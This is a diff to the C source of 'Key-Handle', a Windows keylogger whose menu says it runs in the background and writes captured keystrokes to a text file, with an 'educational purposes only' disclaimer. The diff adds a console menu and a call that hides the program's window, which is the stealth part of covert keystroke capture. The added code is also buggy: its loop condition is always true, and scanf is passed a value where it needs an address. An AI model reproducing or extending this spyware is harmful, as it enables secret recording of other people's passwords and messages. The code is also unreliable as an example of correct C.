@@ -9,18 +9,38 @@
     #define true 1
 #endif
 
+void renderMenu(); // function prototype
+
+void clear() {
+    system("cls");
+}
+
+void handleDirectory() {
+    clear();
+    puts("\nThis is still under construction...\n\nPress enter to return to the menu.");
+    getchar();
+    renderMenu();
+}
+
 void renderMenu() { 
-    puts("[ Key-Handle ] - By alta\n"
+    size_t input = 0;
+    while(input != 1 || input != 2) {
+        clear();
+        printf("\n[ Key-Handle ] - By alta\n"
          "-------------------------------------------------------------------------------------\n"
          "Key-Handle is a simple key capturing program that runs as a process in the background\n"
          "and writes the keystrokes to a textfile in the directory the program was ran\n"
          "DISCLAIMER: alta is not responsible for any malicious use of this software,\n"
          "            it was made for educational purposes only.\n"
-         "-------------------------------------------------------------------------------------\n"
+         "-------------------------------------------------------------------------------------\n\n"
          "1) Start capturing\n"
-         "2) Configure write directory\n");
+         "2) Configure write directory\n\n"
+         "Input>%c", ' ');
+        scanf("%d", input);
 
-    getchar();
+        if(input == 2) { handleDirectory(); }
+    } 
+    // If input == 1 we return to main.
 }
 
 int main(int argc, char* argv[]) {
@@ -33,7 +53,9 @@ int main(int argc, char* argv[]) {
     while(1) {
 
         if(showMenu) { renderMenu(); }
-
+        showMenu = false;
+        
+        ShowWindow(window,0);
         //close program when Esc pressed
         if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
             break;
